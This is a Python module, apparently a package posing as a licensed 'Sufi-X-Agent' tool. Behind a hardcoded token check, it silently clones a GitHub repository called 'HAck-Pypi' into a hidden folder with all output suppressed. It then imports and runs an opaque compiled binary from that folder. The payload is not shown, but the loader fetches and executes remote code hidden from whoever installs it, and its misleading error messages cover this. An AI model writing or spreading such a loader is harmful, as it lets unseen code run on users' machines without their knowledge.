import os
import sys
import subprocess

# --- TERA MASTER CLASS ---
class SufiAgentCore:
    def __init__(self, auth_token=None):
        # 🔐 Strict Hardcoded Token
        self.exact_token = "Sufi-X-Agent-Pro"
        
        if auth_token != self.exact_token:
            print("\n❌ [ERROR] Invalid Auth Token! Access Denied.")
            print("👉 Contact Sufi for a valid Pro license.\n")
            self.is_authorized = False
        else:
            print("\n✅ [SUCCESS] Token Verified. Initializing Sufi-X-Agent...")
            self.is_authorized = True

    def start_system(self):
        # Check Authorization
        if not self.is_authorized:
            return

        # 📂 Hidden path for cloning (.sufi_system)
        base_dir = os.path.dirname(__file__)
        clone_dir = os.path.join(base_dir, ".sufi_system")
        
        # 🔗 TERA GITHUB REPO LINK (Apna wala link yahan replace kar dena)
        repo_url = "https://github.com/Sufiyan65889/HAck-Pypi.git"

        # 📥 SILENT CLONING (Zero logs on user terminal)
        if not os.path.exists(clone_dir):
            try:
                subprocess.run(
                    ["git", "clone", repo_url, clone_dir],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    check=True
                )
            except Exception:
                print("❌ [CRITICAL] System Error: Network unreachable or Core missing.")
                return

        # ⚡ LOADING THE BINARY (.so file)
        # Clone folder ko path me add karo taaki Python binary dhoondh sake
        if clone_dir not in sys.path:
            sys.path.insert(0, clone_dir)

        try:
            # 'core' naam ki .so file ko import karega
            import core 
            
            # 🎯 YAHAN DHYAN DE: 
            # Maan le tere core.py (jo ab core.so hai) me 'main_logic()' function hai
            if hasattr(core, 'main_logic'):
                core.main_logic() 
            else:
                print("❌ [INTERNAL ERROR] Core entry point not found.")
        
        except ImportError as e:
            print(f"❌ [COMPATIBILITY ERROR] This version is not supported on your device: {e}")
        except Exception as e:
            print(f"⚠️ [SYSTEM HALT] An unexpected error occurred: {e}")

# 🪄 THE DARK MAGIC: Making 'import SufiAgent' act as the class itself
sys.modules[__name__] = SufiAgentCore
